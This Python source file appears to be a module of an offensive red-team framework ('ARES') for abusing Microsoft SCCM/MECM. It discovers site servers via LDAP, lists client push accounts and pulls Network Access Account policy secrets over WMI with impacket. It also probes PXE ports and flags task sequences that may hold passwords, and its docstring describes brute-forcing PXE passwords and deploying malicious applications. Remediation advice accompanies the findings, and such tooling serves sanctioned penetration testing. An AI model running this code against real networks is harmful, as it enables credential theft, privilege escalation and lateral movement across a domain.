"""
ad.sccm — SCCM/MECM Abuse Module
MITRE: T1078.002 (Valid Accounts: Domain Accounts)
       T1021.006 (Remote Services: WinRM)

Exploits Microsoft Endpoint Configuration Manager (MECM/SCCM) for:

  1. Network Access Account (NAA) credential extraction
     - Query WMI for SCCM client policy containing encrypted NAA creds
     - Decrypt using DPAPI machine key (requires local admin on SCCM client)
     - NAA creds often have excessive privileges (domain admin-level)

  2. PXE Boot Image abuse
     - Query SCCM distribution points for PXE-enabled boot images
     - Extract media variables file containing encrypted credentials
     - Decrypt using known PXE password or brute-force short passwords

  3. Application deployment abuse
     - Enumerate SCCM applications with embedded credentials
     - Scripts in task sequences may contain plaintext passwords
     - Deploy malicious application to target collection (requires SCCM admin)

  4. Client push installation credential capture
     - SCCM client push uses a domain account to install agents
     - This account often has local admin on ALL domain computers
     - Capture push credentials via SMB relay or by reading site config

OPSEC: MEDIUM — WMI/LDAP queries are relatively quiet.
       Application deployment is HIGH_NOISE.

Dependencies: impacket (WMI, SMB), ldap3 (AD enumeration)
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.sccm")


class SCCMModule(BaseModule):
    """
    ad.sccm — SCCM/MECM enumeration and credential extraction

    OPSEC: MEDIUM
    MITRE: T1078.002, T1021.006
    REQUIRES: domain_creds, local_admin_creds (for NAA extraction)
    OUTPUTS:  cleartext_credentials, sccm_findings, owned_hosts
    """
    MODULE_ID          = "ad.sccm"
    MODULE_NAME        = "SCCM/MECM Abuse"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Enumerate and exploit SCCM/MECM for credential extraction: "
        "Network Access Account, PXE boot images, task sequence passwords, "
        "client push installation accounts."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["domain_creds"]
    OUTPUTS            = ["cleartext_credentials", "sccm_findings", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1078.002", "T1021.006"]

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.sccm requires 'dc' (Domain Controller IP).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.sccm requires 'domain'.",
                module_id=self.MODULE_ID, field="domain",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            sccm_server=ctx.params.get("sccm_server", ""),
            target=ctx.params.get("target", ""),
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.sccm")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  sccm_server: str = "", target: str = "",
                  **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        dc = sanitize_hostname(dc)
        domain = sanitize_ldap(domain)
        await self.before_request(dc, "ldap")

        audit("sccm_abuse", actor="operator", technique="T1078.002",
              source="operator", target=dc,
              detail=f"domain={domain} sccm_server={sccm_server or 'auto-discover'}")

        loop = asyncio.get_running_loop()
        raw: dict[str, Any] = {"dc": dc, "domain": domain}

        # ── Step 1: Discover SCCM infrastructure via LDAP/DNS ─────────────
        sccm_info = await loop.run_in_executor(
            None, lambda: self._discover_sccm(dc, domain, username, password, sccm_server)
        )
        raw["sccm_discovery"] = sccm_info

        if not sccm_info.get("site_servers"):
            raw["result"] = "no_sccm_found"
            return self._findings[:], raw

        sccm_host = sccm_info["site_servers"][0]
        site_code = sccm_info.get("site_code", "")

        self.finding(
            title=f"SCCM Infrastructure Found: {sccm_host} (Site: {site_code})",
            description=(
                f"SCCM/MECM site server discovered at {sccm_host} "
                f"(Site Code: {site_code}). "
                f"Management Points: {sccm_info.get('management_points', [])}. "
                f"Distribution Points: {sccm_info.get('distribution_points', [])}."
            ),
            severity=Severity.INFO,
            mitre_technique="T1018", mitre_tactic="Discovery",
            evidence=sccm_info, host=sccm_host, confidence=0.95,
            remediation="Verify SCCM hardening per Microsoft best practices.",
        )

        # ── Step 2: Enumerate client push account ─────────────────────────
        push_info = await loop.run_in_executor(
            None, lambda: self._enum_client_push(dc, domain, username, password, site_code)
        )
        raw["client_push"] = push_info

        if push_info.get("push_accounts"):
            self.finding(
                title=f"SCCM Client Push Accounts Found: {len(push_info['push_accounts'])}",
                description=(
                    f"SCCM client push installation accounts discovered: "
                    f"{push_info['push_accounts']}. "
                    "These accounts typically have local admin on ALL domain computers. "
                    "If compromised, they provide immediate lateral movement to every machine."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1078.002", mitre_tactic="Privilege Escalation",
                evidence=push_info, host=sccm_host, confidence=0.85,
                remediation=(
                    "1. Minimize client push account privileges. "
                    "2. Use client push with a dedicated, low-privilege account. "
                    "3. Prefer manual or GPO-based client installation instead. "
                    "4. Monitor for Event ID 4624 logon events from push accounts."
                ),
            )

        # ── Step 3: Enumerate NAA via WMI (requires admin on SCCM client) ─
        naa_target = target or sccm_host
        naa_info = await loop.run_in_executor(
            None, lambda: self._extract_naa(naa_target, domain, username, password)
        )
        raw["naa"] = naa_info

        if naa_info.get("naa_username"):
            self.finding(
                title=f"SCCM NAA Credentials Extracted: {naa_info['naa_username']}",
                description=(
                    f"Network Access Account credentials extracted from SCCM client "
                    f"policy on {naa_target}: {naa_info['naa_username']}. "
                    "NAA accounts are used by SCCM clients to access distribution points. "
                    "They frequently have excessive privileges — test for domain admin access."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1078.002", mitre_tactic="Credential Access",
                evidence={"naa_username": naa_info["naa_username"],
                          "source": naa_target, "encrypted": naa_info.get("encrypted", True)},
                host=naa_target, confidence=0.95,
                remediation=(
                    "1. Remove NAA configuration — use Enhanced HTTP instead. "
                    "2. If NAA is required, use a dedicated account with minimal permissions. "
                    "3. Rotate NAA password immediately. "
                    "4. Audit NAA account permissions in Active Directory."
                ),
            )
            raw["cleartext_credentials"] = [{
                "username": naa_info["naa_username"],
                "source": "sccm_naa",
                "host": naa_target,
            }]

        # ── Step 4: Check PXE configuration ──────────────────────────────
        pxe_info = await loop.run_in_executor(
            None, lambda: self._check_pxe(
                sccm_info.get("distribution_points", []),
                domain, username, password,
            )
        )
        raw["pxe"] = pxe_info

        if pxe_info.get("pxe_enabled"):
            password_protected = pxe_info.get("password_protected", False)
            self.finding(
                title=f"SCCM PXE Boot Enabled on {len(pxe_info.get('pxe_dps', []))} DPs",
                description=(
                    f"PXE boot is enabled on distribution points: "
                    f"{pxe_info.get('pxe_dps', [])}. "
                    f"Password protected: {password_protected}. "
                    + ("PXE media variables may contain encrypted credentials "
                       "that can be extracted and decrypted."
                       if not password_protected else
                       "PXE is password-protected, but short passwords can be brute-forced.")
                ),
                severity=Severity.HIGH if not password_protected else Severity.MEDIUM,
                mitre_technique="T1078.002", mitre_tactic="Credential Access",
                evidence=pxe_info, host=sccm_host, confidence=0.85,
                remediation=(
                    "1. Set strong PXE boot passwords (16+ chars). "
                    "2. Enable PXE responder point certificate validation. "
                    "3. Restrict PXE to known MAC addresses only. "
                    "4. Consider disabling PXE if not actively used."
                ),
            )

        # ── Step 5: Enumerate task sequences for embedded credentials ─────
        task_seq_info = await loop.run_in_executor(
            None, lambda: self._enum_task_sequences(dc, domain, username, password, site_code)
        )
        raw["task_sequences"] = task_seq_info

        if task_seq_info.get("sequences_with_creds"):
            self.finding(
                title=f"Task Sequences with Embedded Credentials: {len(task_seq_info['sequences_with_creds'])}",
                description=(
                    f"Found {len(task_seq_info['sequences_with_creds'])} SCCM task sequences "
                    "that may contain embedded credentials (Run Command Line steps, "
                    "network access accounts, domain join accounts). "
                    f"Sequences: {[s['name'] for s in task_seq_info['sequences_with_creds'][:5]]}"
                ),
                severity=Severity.HIGH,
                mitre_technique="T1552.001", mitre_tactic="Credential Access",
                evidence=task_seq_info, host=sccm_host, confidence=0.75,
                remediation=(
                    "1. Audit all task sequences for embedded credentials. "
                    "2. Use task sequence variables with 'hidden' flag instead of plaintext. "
                    "3. Rotate any credentials found in task sequences. "
                    "4. Restrict task sequence editing to SCCM administrators only."
                ),
            )

        raw["sccm_findings"] = self._findings
        return self._findings[:], raw

    # ── Discovery ─────────────────────────────────────────────────────────────

    def _discover_sccm(self, dc: str, domain: str, username: str,
                        password: str, sccm_server: str) -> dict:
        """Discover SCCM infrastructure via LDAP and DNS."""
        result: dict = {"error": None, "site_servers": [], "management_points": [],
                         "distribution_points": [], "site_code": ""}
        try:
            import ldap3
            import ssl
            tls = ldap3.Tls(validate=ssl.CERT_NONE)
            server = ldap3.Server(dc, port=389, connect_timeout=10)
            conn = ldap3.Connection(
                server, user=f"{domain.upper()}\\{username}",
                password=password, authentication=ldap3.NTLM,
                auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
            )
            if not conn.bind():
                result["error"] = "LDAP bind failed"
                return result

            base = ",".join(f"DC={p}" for p in domain.upper().split("."))

            # Search for SCCM System Management container
            sccm_base = f"CN=System Management,CN=System,{base}"
            conn.search(
                sccm_base,
                "(objectClass=mSSMSSite)",
                search_scope=ldap3.SUBTREE,
                attributes=["mSSMSSiteCode", "mSSMSRoamingBoundaries",
                             "mSSMSDefaultMP", "dNSHostName"],
            )
            for entry in conn.entries:
                site_code = str(entry.mSSMSSiteCode) if hasattr(entry, "mSSMSSiteCode") else ""
                if site_code:
                    result["site_code"] = site_code

            # Search for site server computer objects
            conn.search(
                base,
                "(&(objectClass=computer)(servicePrincipalName=*SMS*))",
                search_scope=ldap3.SUBTREE,
                attributes=["dNSHostName", "servicePrincipalName"],
            )
            for entry in conn.entries:
                dns = str(entry.dNSHostName) if hasattr(entry, "dNSHostName") else ""
                if dns:
                    spns = [str(s) for s in entry.servicePrincipalName] if hasattr(entry, "servicePrincipalName") else []
                    if any("SMS" in s for s in spns):
                        result["site_servers"].append(dns)
                    if any("SMSDistributionPoint" in s for s in spns):
                        result["distribution_points"].append(dns)
                    if any("SMSMP" in s or "SMS_MP" in s for s in spns):
                        result["management_points"].append(dns)

            # Use provided server if discovery found nothing
            if not result["site_servers"] and sccm_server:
                result["site_servers"] = [sccm_server]

            conn.unbind()
        except Exception as exc:
            result["error"] = str(exc)[:200]
        return result

    def _enum_client_push(self, dc: str, domain: str, username: str,
                           password: str, site_code: str) -> dict:
        """Enumerate SCCM client push installation accounts."""
        result: dict = {"push_accounts": [], "error": None}
        try:
            import ldap3
            server = ldap3.Server(dc, port=389, connect_timeout=10)
            conn = ldap3.Connection(
                server, user=f"{domain.upper()}\\{username}",
                password=password, authentication=ldap3.NTLM,
                auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
            )
            if not conn.bind():
                result["error"] = "LDAP bind failed"
                return result

            base = ",".join(f"DC={p}" for p in domain.upper().split("."))

            # Search for accounts with "client push" or "SCCM" in description
            conn.search(
                base,
                "(&(objectClass=user)(|(description=*client push*)(description=*SCCM*)(description=*MECM*)(description=*ConfigMgr*)))",
                search_scope=ldap3.SUBTREE,
                attributes=["sAMAccountName", "description", "memberOf",
                             "adminCount", "lastLogon"],
            )
            for entry in conn.entries:
                sam = str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else ""
                desc = str(entry.description) if hasattr(entry, "description") else ""
                admin = bool(entry.adminCount) if hasattr(entry, "adminCount") else False
                groups = [str(g) for g in entry.memberOf] if hasattr(entry, "memberOf") else []
                is_da = any("Domain Admins" in g for g in groups)
                if sam:
                    result["push_accounts"].append({
                        "username": sam,
                        "description": desc[:100],
                        "admin_count": admin,
                        "is_domain_admin": is_da,
                        "groups": [g.split(",")[0].replace("CN=", "") for g in groups[:5]],
                    })
            conn.unbind()
        except Exception as exc:
            result["error"] = str(exc)[:200]
        return result

    def _extract_naa(self, target: str, domain: str,
                      username: str, password: str) -> dict:
        """
        Extract NAA credentials from SCCM client via WMI.

        Queries CCM_NetworkAccessAccount WMI class on the SCCM client.
        The NAA username and password are stored in the client's WMI repository
        protected by DPAPI (machine key).

        Requires local admin on the SCCM client (target).
        """
        result: dict = {"naa_username": "", "naa_domain": "", "encrypted": True,
                         "error": None}
        try:
            from impacket.dcerpc.v5.dcomrt import DCOMConnection
            from impacket.dcerpc.v5.dcom import wmi as wmimod
            from impacket.dcerpc.v5.dtypes import NULL

            lmhash, nthash = "", ""
            dcom = DCOMConnection(
                target, username=username, password=password,
                domain=domain, lmhash=lmhash, nthash=nthash,
                oxidResolver=True, doKerberos=False,
            )
            iInterface = dcom.CoCreateInstanceEx(
                wmimod.CLSID_WbemLevel1Login, wmimod.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmimod.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(
                f"\\\\{target}\\root\\ccm\\policy\\Machine\\ActualConfig",
                NULL, NULL,
            )
            iWbemLevel1Login.RemRelease()

            # Query for NAA policy
            try:
                iEnumWbemClassObject = iWbemServices.ExecQuery(
                    "SELECT * FROM CCM_NetworkAccessAccount"
                )
                while True:
                    try:
                        pEnum = iEnumWbemClassObject.Next(0xffffffff, 1)
                    except Exception:
                        break
                    record = pEnum[0]
                    naa_user = str(record.NetworkAccessUsername or "")
                    naa_pass = str(record.NetworkAccessPassword or "")

                    # NAA values are hex-encoded and DPAPI-encrypted
                    # Format: <PolicySecret Version="1"><![CDATA[hexdata]]></PolicySecret>
                    if naa_user:
                        # Strip XML wrapper if present
                        if "CDATA[" in naa_user:
                            naa_user = naa_user.split("CDATA[")[1].split("]]")[0]
                        result["naa_username"] = naa_user
                        result["encrypted"] = len(naa_user) > 50  # DPAPI blob is long
                    if naa_pass:
                        if "CDATA[" in naa_pass:
                            naa_pass = naa_pass.split("CDATA[")[1].split("]]")[0]
                        result["naa_password_blob"] = naa_pass[:50] + "..."
                        result["encrypted"] = True

            except Exception as wmi_exc:
                result["error"] = f"WMI query failed: {str(wmi_exc)[:150]}"

            dcom.disconnect()

        except ImportError:
            result["error"] = "impacket not installed"
        except Exception as exc:
            err = str(exc).lower()
            if "access denied" in err or "access_denied" in err:
                result["error"] = f"Access denied on {target} — need local admin"
            else:
                result["error"] = str(exc)[:200]
        return result

    def _check_pxe(self, distribution_points: list[str],
                    domain: str, username: str, password: str) -> dict:
        """Check if PXE boot is enabled on distribution points."""
        result: dict = {"pxe_enabled": False, "pxe_dps": [],
                         "password_protected": False, "error": None}
        try:
            import socket
            for dp in distribution_points[:10]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(3)
                    # DHCP PXE discovery — send DHCP DISCOVER with PXE vendor class
                    # Check if port 4011 (PXE) or 67 (DHCP) responds
                    for port in [4011, 67]:
                        try:
                            sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock_tcp.settimeout(3)
                            if sock_tcp.connect_ex((dp, port)) == 0:
                                result["pxe_enabled"] = True
                                result["pxe_dps"].append(dp)
                            sock_tcp.close()
                        except Exception:
                            pass
                    sock.close()
                except Exception:
                    pass
        except Exception as exc:
            result["error"] = str(exc)[:150]
        return result

    def _enum_task_sequences(self, dc: str, domain: str, username: str,
                              password: str, site_code: str) -> dict:
        """Enumerate SCCM task sequences that may contain credentials."""
        result: dict = {"sequences_with_creds": [], "total_sequences": 0, "error": None}
        try:
            import ldap3
            server = ldap3.Server(dc, port=389, connect_timeout=10)
            conn = ldap3.Connection(
                server, user=f"{domain.upper()}\\{username}",
                password=password, authentication=ldap3.NTLM,
                auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
            )
            if not conn.bind():
                result["error"] = "LDAP bind failed"
                return result

            base = ",".join(f"DC={p}" for p in domain.upper().split("."))

            # Search for SCCM package objects (task sequences are a type of package)
            sccm_base = f"CN=System Management,CN=System,{base}"
            conn.search(
                sccm_base,
                "(objectClass=mSSMSPackage)",
                search_scope=ldap3.SUBTREE,
                attributes=["cn", "mSSMSPackageID", "description"],
            )
            result["total_sequences"] = len(conn.entries)

            # Flag sequences that mention credentials in description
            cred_keywords = ["password", "credential", "domain join",
                              "network access", "run as", "service account"]
            for entry in conn.entries:
                name = str(entry.cn) if hasattr(entry, "cn") else ""
                desc = str(getattr(entry, "description", "")).lower()
                pkg_id = str(entry.mSSMSPackageID) if hasattr(entry, "mSSMSPackageID") else ""
                if any(kw in desc for kw in cred_keywords) or any(kw in name.lower() for kw in cred_keywords):
                    result["sequences_with_creds"].append({
                        "name": name,
                        "package_id": pkg_id,
                        "reason": "Description or name contains credential-related keywords",
                    })
            conn.unbind()
        except Exception as exc:
            result["error"] = str(exc)[:200]
        return result
